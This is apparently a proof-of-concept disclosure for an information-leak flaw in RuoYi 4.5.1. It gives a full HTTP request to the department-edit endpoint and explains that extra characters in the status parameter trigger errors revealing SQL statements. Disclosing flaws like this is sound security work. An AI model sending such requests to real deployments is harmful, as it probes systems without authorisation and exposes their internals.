RuoYi 4.5.1 has an information leakage vulnerability
# POC
```
POST /system/dept/edit HTTP/1.1
Host: 127.0.0.1
Content-Length: 209
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/system/dept/edit/103
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=a484ff97-3a44-4dc2-bc54-e0332d37da5b
Connection: close

deptId=103&parentId=101&parentName=%E6%B7%B1%E5%9C%B3%E6%80%BB%E5%85%AC%E5%8F%B8&deptName=%E7%A0%94%E5%8F%91%E9%83%A8%E9%97%A8&orderNum=1&leader=%E8%8B%A5%E4%BE%9D&phone=15888888888&email=ry%40qq.com&status=1&
```

Splicing any character after the `status` parameter will result in an error message containing a vulnerability SQL statement
![image](https://github.com/Fr1ezy/POC/assets/54392222/0595d7dd-a2a0-4382-a7d7-5527abac72d1)

# Code
- The status parameter is defined as a `String` type on the backend, but the database is defined as a `char` type
- The char type is used to store fixed length strings, and when the length of the stored string is less than the defined length, spaces will be filled at the end of the string. Therefore, if the status parameter is modified beyond the default length of char, it will cause an error and leak the SQL statements used for database queries
![image](https://github.com/Fr1ezy/POC/assets/54392222/9a4d9797-817d-4d43-8e53-9d21759a9e0a)
![image](https://github.com/Fr1ezy/POC/assets/54392222/195c9717-b746-4b26-adab-94d8981d4a3d)

